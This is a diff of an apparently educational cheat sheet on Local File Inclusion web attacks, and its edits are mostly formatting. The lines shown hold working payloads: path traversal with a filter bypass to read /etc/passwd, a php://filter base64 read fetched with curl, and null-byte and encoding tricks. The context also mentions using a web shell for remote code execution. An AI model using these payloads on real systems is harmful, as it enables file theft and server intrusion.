@@ -51,13 +51,21 @@ We will need to use the following payload :
 http://SITE/index.php?SOMETHING=....//....//....//....//....//etc/passwd
 ```
 
-> You can also use URL encoding. For example, replacing ```../``` by ```%2e%2e%2f```. For more URL encoding look at the [Bypass Techniques](#Bypass Techniques) part.
+> You can also use URL encoding. For example, replacing ```../``` by ```%2e%2e%2f```. For more URL encoding look at the [Bypass Techniques](#bypass-techniques) part.
 {: .prompt-tip }
 
 ### Appended Extension 
 
 If you try the basic LFI technique and the URL is redirected to ```http://SITE/index.php?SOMETHING=/etc/passwd.php``` then the server append the ```.php``` extension.
-We can then try to navigate to ```http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ```. We can use the curl command as follows ```curl http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ``` and then use the ```base64 -d``` command to decode it.
+We can then try to navigate to :
+```console
+http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ
+```
+We can use the curl command as follows :
+```console
+curl http://SITE/?SOMETHING=php://filter/read=convert.base64-encode/resource=FILE_TO_READ
+```
+And then use the ```base64 -d``` command to decode it.
 
 We could also try to use the null byte ```%00``` to get rid of the extension :
 ```console
@@ -150,7 +158,7 @@ Then we create a classic web shell. You can also use pre-made web shell like [th
 
 Then we need to specify our IP and port so that the web shell is executed. Here we have executed the "id" command.
 
-If the server was on the windows machine we may have preferred a SMB share instead. We would have done the following steps :
+If the server was on the ```windows machine``` we may have preferred a SMB share instead. We would have done the following steps :
 
 1.
 ```console
